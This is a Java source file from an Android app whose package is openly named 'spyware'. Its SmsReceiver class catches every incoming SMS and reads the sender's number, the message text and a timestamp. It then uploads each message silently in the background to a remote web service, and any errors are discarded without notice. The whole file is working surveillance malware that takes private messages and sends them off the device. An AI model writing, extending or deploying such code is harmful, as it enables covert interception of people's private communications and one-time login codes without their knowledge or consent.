package com.example.tienbi.spyware.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.SystemClock;
import android.telephony.SmsMessage;

import com.example.tienbi.spyware.mode.WebService;
import com.example.tienbi.spyware.mode.SMSInfo;

import java.text.SimpleDateFormat;
import java.util.Calendar;

/**
 * Created by TienBi on 15/09/2016.
 */
public class SmsReceiver extends BroadcastReceiver{
    public boolean isConnect(Context context){
        ConnectivityManager cm =
                (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = cm.getActiveNetworkInfo();
        boolean b= netInfo != null && netInfo.isConnectedOrConnecting();
        return b;
    }
    @Override
    public void onReceive(Context context, Intent intent) {
        if(isConnect(context))
        {
            try
            {
                sent(intent);
            }
            catch(Exception ex)
            {
            }
        }
        else
        {
        }
    }

    private void sent(Intent intent) {
        Bundle bundle=intent.getExtras();
        Object[] arrPdus =(Object[]) bundle.get("pdus");
        for (int i = 0; i <arrPdus.length ; i++) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) arrPdus[i]);
            String noidung = sms.getMessageBody();
            String phone = sms.getOriginatingAddress();

            Calendar cal = Calendar.getInstance();
            SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy  HH:mm:ss a");
            String date = sdf.format(cal.getTime());

            SMSInfo smsInfor=new  SMSInfo();
            smsInfor.setBody(noidung);
            smsInfor.setPhoneNumber(phone);
            smsInfor.setTimeStamp(date);

            SmsTask smsTask=new SmsTask();
            smsTask.execute(smsInfor);
            SystemClock.sleep(100);
        }
    }
    class SmsTask extends AsyncTask<SMSInfo,Void,Void>{
        @Override
        protected Void doInBackground(SMSInfo... params) {
            SMSInfo sms = new SMSInfo();
            sms=params[0];
            WebService ws=new WebService();
            ws.saveSMS(sms.getPhoneNumber(),sms.getTimeStamp(),sms.getBody());
            return null;
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
        }

        @Override
        protected void onProgressUpdate(Void... values) {
            super.onProgressUpdate(values);
        }
    }
}
